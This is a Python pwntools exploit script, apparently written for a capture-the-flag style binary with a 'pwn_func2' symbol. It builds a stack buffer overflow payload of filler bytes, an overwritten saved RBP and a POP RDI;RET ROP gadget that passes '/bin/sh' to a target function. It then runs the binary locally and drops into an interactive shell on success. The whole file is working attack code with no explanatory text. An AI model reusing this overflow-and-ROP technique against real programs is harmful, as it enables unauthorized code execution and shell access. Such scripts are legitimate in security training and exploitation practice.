#!/usr/bin/env python3

import sys
from pwn import *

exe = sys.argv[1]
elf = ELF(exe)
pwnfunc2 = elf.symbols['pwn_func2']
rop = ROP(elf)

rdi = rop.rdi
print(f"GADGET : {rdi}")

#rdi2 = rop.find_gadget(["mov rdi, rax", ret])

#print(f"GADGET2 : {rdi2}")


payload = (b'prints '
	+ (b'\xff' * 540) #op1+cmd1
	+ (b'\0' * 4) #i
	+ (b'\0' * 8) #RBP
	+ p64(rdi.address) #RIP -> POP RDI;RET
	+ (b'/bin/sh$') #ARG -> RDI
	+ p64(pwnfunc2) # RIP - pwn_func1
)

print(f"PAYLOAD: {payload}")

with open('/dev/null', 'wb') as err:
	io = process(exe, stderr=err)
	io.sendline(payload)
	io.recvuntil(b'Enter command: ')
	io.send(b'exec\n')
	out1 = io.recvuntil(b'\n')
	print(f">> RECV! {out1}")
	if b'PWNED' in out1:
		io.interactive()
	#out2 = io.recvuntil((b'Enter command: ', b'\n'))
	#print(f">> RECV2 {out2}")
